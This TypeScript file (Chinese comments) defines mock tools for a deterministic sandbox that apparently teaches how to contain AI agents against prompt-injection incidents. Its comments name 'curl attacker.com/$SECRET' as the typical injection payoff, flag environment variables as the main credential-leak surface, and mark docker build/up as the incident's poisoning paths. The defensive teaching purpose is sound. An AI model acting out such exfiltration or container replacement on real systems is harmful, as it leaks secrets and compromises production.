// ============================================================
// 工具注册表（mock 执行器：确定性，不碰真实 FS/网络/模型）
//   执行结果只依赖 (args, ctx) → 同一输入序列必得同一输出（S6）
// ============================================================
import { ToolError } from "./types.js";
import type { World } from "./sandbox.js";
import type { Sandbox } from "./sandbox.js";

/** 执行上下文：host=生产世界；sandbox=隔离视图（null=无沙箱层，E 课之前的状态）；step=逻辑时钟 */
export interface ExecCtx {
  host: World;
  sandbox: Sandbox | null;
  hostEnv: Record<string, string>;
  step: number;
}

export interface ToolSpec {
  name: string;
  readonly?: boolean;
  execute(args: Record<string, unknown>, ctx: ExecCtx): string;
}

const str = (args: Record<string, unknown>, k: string): string => String(args[k] ?? "");
/** 本次调用作用于哪个世界视图：有沙箱就只见它的隔离视图（生产不可见） */
const targetWorld = (ctx: ExecCtx): World => (ctx.sandbox ? ctx.sandbox.world : ctx.host);
/** 路径参数：有沙箱过路径边界，无沙箱原样（E 课之前没有执行环境边界） */
const pth = (args: Record<string, unknown>, k: string, ctx: ExecCtx): string =>
  ctx.sandbox ? ctx.sandbox.path(str(args, k)) : str(args, k);

export const TOOLS: ToolSpec[] = [
  {
    name: "read_file", readonly: true, // 读文件（逻辑路径）
    execute(args, ctx) {
      const p = pth(args, "path", ctx);
      const c = targetWorld(ctx).fs.get(p);
      if (c === undefined) throw new ToolError(`文件不存在: ${p}`);
      return c;
    },
  },
  {
    name: "write_file", // 写文件（逻辑路径）
    execute(args, ctx) {
      const p = pth(args, "path", ctx);
      const content = str(args, "content");
      const w = targetWorld(ctx);
      w.fs.set(p, content);
      w.change(`write ${p} (${content.length}B)`);
      return `已写入 ${p} (${content.length}B, ns=${w.ns})`;
    },
  },
  {
    name: "print_env", readonly: true, // 打印可见环境变量（S4：env 是最大凭据泄漏面）
    execute(_args, ctx) {
      const sb = ctx.sandbox;
      if (!sb) return `可见 env: ${Object.keys(ctx.hostEnv).join(", ")}（无边界：整个 env 可见，含凭据!）`;
      const visible = sb.config.envWhitelist.map((n) => `${n}=${sb.env(n)}`).join(", ");
      const hidden = Object.keys(sb.hostEnv).filter((n) => !sb.config.envWhitelist.includes(n));
      return `可见 env: ${visible || "(空)"}；${hidden.length} 个敏感变量未注入可见 env（S4）: ${hidden.join(", ") || "无"}`;
    },
  },
  {
    name: "net_fetch", // 出网请求（注入的典型 payoff: curl attacker.com/$SECRET）
    execute(args, ctx) {
      const url = str(args, "url");
      if (ctx.sandbox) ctx.sandbox.openNetwork(url); // 有沙箱 → egress 禁用，抛违规
      return `mock: 出网成功 ${url}（真实世界里数据已经发走了!）`;
    },
  },
  {
    name: "run_shell", // 执行 shell 命令（真实世界=本机 root 权限，即事故里的动作面）
    execute(args) {
      return `mock: 执行 ${str(args, "cmd")}`;
    },
  },
  {
    name: "docker_compose_build", // 从目录树构建镜像（非幂等；事故毒化路径 1/2）
    execute(args, ctx) {
      const project = str(args, "project");
      const dir = pth(args, "dir", ctx);
      const w = targetWorld(ctx);
      w.change(`build ${project}:latest ← ${dir}`);
      return `已构建 ${project}:latest（from ${dir}, ns=${w.ns}）`;
    },
  },
  {
    name: "docker_compose_up", // 按容器名启动/替换容器（非幂等；事故毒化路径 2/2）
    execute(args, ctx) {
      const project = str(args, "project");
      const dir = pth(args, "dir", ctx);
      const services = (Array.isArray(args.services) ? args.services : []).map(String);
      const w = targetWorld(ctx);
      for (const s of services) {
        const name = `${project}-${s}`;
        w.containers.set(name, { name, image: `${name}:latest`, builtFrom: dir, startedAtStep: ctx.step });
        w.change(`up ${name} ← ${dir} (step ${ctx.step})`);
      }
      return `up ${services.map((s) => `${project}-${s}`).join(", ")}（ns=${w.ns}）${ctx.sandbox ? " —— 隔离命名空间内执行，生产不可见" : ""}`;
    },
  },
  {
    name: "check_container", readonly: true, // 运维规则：核对容器构建来源（事后校验，S5）
    execute(args, ctx) {
      const name = str(args, "name");
      const expect = str(args, "expectBuiltFrom");
      const c = ctx.host.containers.get(name); // 运维检查恒看生产命名空间（host）
      if (!c) return `${name} 不存在 (ns=host)`;
      if (c.builtFrom === expect) return `✅ ${name} 正常：构建自 ${c.builtFrom}，step ${c.startedAtStep} 启动`;
      return `⚠️ ${name} 被替换! 构建自 ${c.builtFrom}（预期 ${expect}），step ${c.startedAtStep} 启动 —— 事后校验规则命中`;
    },
  },
];

/** 直接执行工具（未知工具/工具错误/边界违规都会抛，由调用方捕获并回写） */
export function execTool(name: string, args: Record<string, unknown>, ctx: ExecCtx): string {
  const spec = TOOLS.find((t) => t.name === name);
  if (!spec) throw new ToolError(`未知工具: ${name}`);
  return spec.execute(args, ctx);
}
